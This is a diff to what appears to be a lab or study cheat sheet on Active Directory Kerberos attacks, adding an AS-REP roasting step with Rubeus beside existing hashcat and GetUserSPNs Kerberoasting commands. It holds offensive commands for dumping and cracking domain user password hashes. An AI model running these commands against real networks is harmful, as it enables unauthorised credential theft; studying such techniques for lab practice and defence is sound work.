@@ -49,6 +49,18 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
 ```
 
+**AS-REP Roasting with Rubeus**
+
+This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+
+```bash
+Rubeus.exe asreproast
+```
+
+Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.
+
+
+
 
 
 
